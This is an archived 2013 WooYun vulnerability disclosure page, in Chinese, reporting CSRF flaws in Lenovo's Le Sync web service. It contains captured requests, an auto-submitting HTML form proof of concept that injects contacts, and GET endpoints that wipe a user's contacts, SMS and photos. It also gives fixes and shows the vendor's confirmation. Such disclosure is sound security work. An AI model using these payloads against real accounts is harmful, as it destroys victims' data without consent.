@@ -1,0 +1,252 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		联想乐同步超严重csrf（同步数据瞬间销毁）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		联想乐同步超严重csrf（同步数据瞬间销毁）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/修码的马修">修码的马修</a> 
+</li><li>提交时间：		2013-10-29 19:22</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-10-29：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-31：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-10：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-20：	细节向普通白帽子公开<br/>
+									2013-11-30：	细节向实习白帽子公开<br/>
+									2013-12-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">如果你非要说乐同步是安全专家，我只能说呵呵。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">案发现场<br />
+<br />
+</p><p class="detail"><a href="../images/3018220754e17ad2a71e13607d5b931f2847d77e.png" target="_blank"><img src="../images/3018220754e17ad2a71e13607d5b931f2847d77e.png" alt="sshot-3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+先抓个包<br />
+<br />
+</p><pre><code>POST /contact/contact/portal/create/contact HTTP/1.1<br />
+Host: pim.lenovo.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 62<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://pim.lenovo.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: ……<br />
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br />
+DNT: 1<br />
+Referer: http://pim.lenovo.com/contact/portal/index.html<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+…………<br />
+NAME%C2%A7-1%C2%A9givenName=xsser&amp;PHONE%C2%A7MOBILE%C2%B60=110</code></pre><p class='detail'><br />
+<br />
+构造poc：<br />
+<br />
+</p><pre><code>&lt;html&gt;<br />
+&lt;body&gt;<br />
+&lt;form id=&quot;yun&quot; name=&quot;yun&quot; action=&quot;http://pim.lenovo.com/contact/contact/portal/create/contact&quot; method=&quot;POST&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;NAME§-1©givenName&quot; value=&quot;波多&quot; /&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;PHONE§MOBILE¶0&quot; value=&quot;10086&quot; /&gt;<br />
+&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;<br />
+&lt;/form&gt;<br />
+&lt;script&gt;<br />
+   document.yun.submit(); <br />
+&lt;/script&gt;<br />
+&lt;/body&gt;<br />
+&lt;/html&gt;</code></pre><p class='detail'><br />
+<br />
+返回代码：{&quot;result&quot;:0,&quot;data&quot;:12707736}<br />
+<br />
+</p><p class="detail"><a href="../images/3018283418480c863d0bcabacf789ac0c604619a.png" target="_blank"><img src="../images/3018283418480c863d0bcabacf789ac0c604619a.png" alt="sshot-4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+哈，如果你通讯录突然出现了女神的名字你会怎样？<br />
+<br />
+然后我想了更邪恶的玩法，假如某人得罪了你，你用这个csrf让他触发，把他通讯录里的某人电话换成某人的电话……<br />
+<br />
+可是经过验证修改联系人时需要联系人的id，也就是上面返回的”data“。<br />
+<br />
+不用灰心，号称安全专家的乐同步为我们开辟了另一条邪恶的路—— 一键销毁，是不是听到名字就热血沸腾？好戏在后面！<br />
+<br />
+</p><p class="detail"><a href="../images/301836417c05301b14ab260c1901b4a769c428ea.png" target="_blank"><img src="../images/301836417c05301b14ab260c1901b4a769c428ea.png" alt="sshot-5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+姑且抓包试试，<br />
+<br />
+</p><pre><code>POST /contact/contact/portal/clearAll/contact?rd=1380531868131 HTTP/1.1<br />
+Host: pim.lenovo.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 0<br />
+Accept: application/json, text/javascript, */*; q=0.01<br />
+Origin: http://pim.lenovo.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: ……<br />
+Referer: http://pim.lenovo.com/contact/contact/portal/user/setting.html?do=clear<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8<br />
+Cookie: ……</code></pre><p class='detail'><br />
+<br />
+我有一种直觉，这里用get也可以的，于是<br />
+<br />
+联系人http://pim.lenovo.com/contact/contact/portal/clearAll/contact<br />
+<br />
+短信http://pim.lenovo.com/sms/portal/clearAll<br />
+<br />
+相片http://pim.lenovo.com/photoapi/v2/deleteall?<br />
+<br />
+返回：{&quot;result&quot;:0}，再回去看看，干净的毛都没有！<br />
+<br />
+可以看到的是，上面还有许多接口，时间关系没有一一列出，但相信csrf普遍存在。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">要说的都说了，不信你自己点开试试，然后你就哭了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1.加token，必须的，一键销毁竟然是get，改post<br />
+<br />
+2.一键销毁要输入验证码，甚至是密码<br />
+<br />
+3.这应用ui确实不错，但除了ui还有很多看不见的地方要关注，不然只会是砸了自己招牌。<br />
+<br />
+4.如果有礼物我会很高兴，如果有20rank我也会很高兴 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/修码的马修" title="修码的马修">修码的马修</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038645" title="联想乐同步超严重csrf（同步数据瞬间销毁）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-10-31 13:07</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38645";
+var bugRating="1";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
